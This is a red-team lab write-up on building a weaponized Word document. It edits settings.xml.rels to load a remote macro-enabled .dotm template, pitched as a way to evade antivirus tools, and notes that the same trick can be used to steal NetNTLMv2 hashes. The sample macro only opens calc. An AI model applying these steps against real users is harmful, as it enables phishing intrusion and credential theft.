# Inject Macros from a Remote Dotm Template

## Inject Macros from a Remote Dotm Template

This lab shows how it is possible to add a macros payload to a docx file indirectly, which has a good chance of evading some AVs/EDRs.

This technique works in the following way:

1. A malicious macro is saved in a Word template .dotm file
2. Benign .docx file is created based on one of the default MS Word Document templates
3. Document from step 2 is saved as .docx
4. Document from step 3 is renamed to .zip
5. Document from step 4 gets unzipped
6. .\word\_rels\settings.xml.rels contains a reference to the template file. That reference gets replaced with a refernce to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
7. File gets zipped back up again and renamed to .docx
8. Done

### Weaponization

Alt+F8 to enter Dev mode where we can edit Macros, select `ThisDocument` and paste in:

{% code title="Doc3.dotm" %}
```javascript
Sub Document_Open()

Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc"

End Sub
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHnzr-8OdMCMkKoxCZ%2F-LaHsr9Df6zSyClDXreO%2FScreenshot%20from%202019-03-18%2022-19-22.png?alt=media\&token=98d42351-6a8b-491c-b546-fe91e836aa73)

Create a benign .docx file based on one of the provided templates and save it as .docx:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHnzr-8OdMCMkKoxCZ%2F-LaHtw6A6pSqS8yRT_4D%2FScreenshot%20from%202019-03-18%2022-24-02.png?alt=media\&token=665364a6-2fdc-4cc4-b250-bf1e6fa42dc9)

Rename legit.docx to legit.zip:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHnzr-8OdMCMkKoxCZ%2F-LaHuXVOCz0pu04UlGl4%2FScreenshot%20from%202019-03-18%2022-26-41.png?alt=media\&token=ba84aa9d-b09e-42d9-b5cf-bea99fbd67bb)

Unzip the archive and edit `word_rels\settings.xml.rels`:

{% code title="word:rels\settings.xml.rels" %}
```markup
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
```
{% endcode %}

Note it has the target template specified here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHnzr-8OdMCMkKoxCZ%2F-LaHwmHfhmC9WmqXqAi0%2FScreenshot%20from%202019-03-18%2022-36-30.png?alt=media\&token=a0e41d01-5236-4d3a-b083-628573a7e503)

Upload the template created previously `Doc3.dot` to an SMB server (note that the file could be hosted on a web server also!).

Update word\_rels\settings.xml.rels to point to Doc3.dotm:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHynbPhOsV7F3bWjyN%2F-LaI0x6LlzkBHXCcae2k%2FScreenshot%20from%202019-03-18%2022-59-07.png?alt=media\&token=cbbe14b9-8a58-4788-b133-69c018ef7394)

Zip all the files of `legit` archive and name it back to .docx - we now have a weaponized document:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaHynbPhOsV7F3bWjyN%2F-LaI2n9iw2zGOJSlqKFI%2FPeek%202019-03-18%2023-07.gif?alt=media\&token=5d33d4e9-e532-4879-a787-9ecfaf40ab75)

{% hint style="info" %}
Note that this technique could be used to steal NetNTLMv2 hashes since the target system is connecting to the attacking system - a responder can be listening there.
{% endhint %}

### References

[![Logo](https://www.ired.team/~gitbook/image?url=https%3A%2F%2Fblog.redxorblue.com%2Ffavicon.ico\&width=20\&dpr=4\&quality=100\&sign=bd520785\&sv=2)Executing Macros From a DOCX With Remote Template Injectionblog.redxorblue.com](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)

